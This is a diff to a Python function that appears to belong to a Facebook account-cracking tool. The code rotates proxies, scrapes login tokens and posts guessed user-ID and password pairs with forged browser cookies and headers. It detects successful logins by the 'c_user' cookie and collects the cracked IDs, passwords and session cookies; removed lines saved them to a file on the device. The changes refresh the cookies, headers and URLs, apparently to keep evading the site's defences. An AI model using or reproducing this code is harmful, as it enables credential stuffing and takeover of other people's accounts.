@@ -1261,7 +1261,7 @@ def mbasic(uid,pwx,tl):
             nip=random.choice(xvx)
             proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
+            free_fb = Session.get('https://m.facebook.com').text 
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1273,36 +1273,38 @@ def mbasic(uid,pwx,tl):
             'trynum': '1',
             'timezone': '-330',
             'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '053656_rlV7',
-            'lgnjs': '1751459817',
+            'lgnrnd': '111001_6tEE',
+            'lgnjs': '1751652605',
             'email': uid,
-            'prefill_contact_point': '',
+            'prefill_contact_point': uid,
             'prefill_source': 'browser_dropdown',
             'prefill_type': 'password',
             'first_prefill_source': 'browser_dropdown',
             'first_prefill_type': 'password',
             'had_cp_prefilled': 'false',
             'had_password_prefilled': 'true',
-            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAMZ/ZZAAAABFAB',
+            'ab_test_data': '/fAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/qAAKVKVAABFAH',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'ps_n': '1',
+            'datr': 'SVRVaCkSemjPQelgXB0y0CcL',
+            'sb': 'SVRVaPjD8b4EFyHYH5_mO7WT',
             'ps_l': '1',
-            'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
-            'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
-            'wd': '1440x804',
-            'locale': 'ja_KS',
-            'fr': '1rNHx4L9yZvgxejws.AWccwPhYlsNwqYaz9O6-iW7jELg43sNtnkdr7Ksa4gVPPDhMuGE.BnXFu6..AAA.0.0.BoZSfn.AWdBp1SZDYu4NFJ8MYq1LGJDOZA',}
+            'ps_n': '1',
+            'dpr': '1',
+            'wd': '866x773',
+            'sfau': 'AYjvkLiLzFgYSyngodu9SL6HPfAq6leSy3-NixdNqB8-phmSyG9OTPjiL8KJ_zIIsK7HkMAVu1ir3lKICD61qSjnAnpeYhxiCyFBvdbzDdNaiDasMGVkDEwqqgrJDrKghprwCiUYcIIJso79VrWtyjN0aSZnL0lPOVFSgFAXAvO54a7BUDCsGgEY-zZdYTl3gfbL3gwcXNbB5yVqBLrsPo517G2WmXs5wS22RrAy7MN9oe1OL4qKoto-Y13vajW1F8nWnsD2PMwVD-dq3RBcnkLcg4Q4jN960pORFza1r9bFMh1x7WAVSVZTIGblmYUA-ZQ',
+            'locale': 'hi_IN',
+            'fr': '0gLfD3AAbAoY0O6GN..BoVVRJ..AAA.0.0.BoaBj4.AWdb3459gghKRKkfhRFWxDK0x7E',
+            'sfiu': 'AYgk5XkeNCcaXp0Rc8mw---8ADJd06wXm9PepyGeW7Cqviw3hRgKQPxonBZTzytOvUTKrODrwQfU55yMqYFACdAhwNrIQ81A65JB0RbJotCpwkn94C5R7-J_Ltc2gX6g77FSa0TcB8gG4lZv_iTN-q9ntPysbyYPCqaNwsZfNNS7Sb34FRJ0d0vORE5DfJpoXIPFCu1Iqz3HuXb3_nmbQMh_8pn3r7PUrnzWQ8Ynzmj11wu371GcsHcMDW6yi8KJSKkuSFZyJFVS4dyYv1bIOLEtH03Irfn3hf-hwie_KPBwdto5u5zH5UDNImRMJ60HYws',}
             headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://ja-ks.facebook.com',
-            'pragma': 'no-cache',
+            'origin': 'https://hi-in.facebook.com',
             'priority': 'u=0, i',
-            'referer': 'https://ja-ks.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv22.0%2Fdialog%2Foauth%3Fstate%3Db2bec8ad-5742-44f9-b7f3-ecc87f97c43a%26scope%3Demail%252Copenid%252Cpublic_profile%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a6d1a2f-531e-4e12-b0db-761dbbdf5726%26tp%3Dunspecified%26cbt%3D1751459415658&lwv=120&lwc=1348028',
-            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
+            'referer': 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
             'sec-fetch-dest': 'document',
@@ -1310,9 +1312,9 @@ def mbasic(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',}
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://ja-ks.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv22.0%2Fdialog%2Foauth%3Fstate%3Db2bec8ad-5742-44f9-b7f3-ecc87f97c43a%26scope%3Demail%252Copenid%252Cpublic_profile%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a6d1a2f-531e-4e12-b0db-761dbbdf5726%26tp%3Dunspecified%26cbt%3D1751459415658&lwv=100'
+            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1321,11 +1323,6 @@ def mbasic(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
-                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        break
-                    else:
                         bkas.append(cid)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{cid}|{pw}|{coki}")
